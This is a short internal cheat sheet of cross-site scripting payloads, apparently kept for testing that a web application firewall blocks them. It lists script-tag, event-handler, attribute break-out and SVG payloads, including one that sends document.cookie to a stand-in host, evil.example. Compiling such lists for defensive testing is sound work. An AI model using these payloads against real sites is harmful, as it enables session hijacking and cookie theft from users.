# XSS Cheatsheet (internal)

Payloads our WAF must block. These are documented as text, never executed.

## Classic
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(document.cookie)>`
- `<svg onload=alert(1)>`

## Attribute break-out
- `" onmouseover="alert(1)`
- `'><script>fetch('//evil.example/'+document.cookie)</script>`

## SVG
- `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`
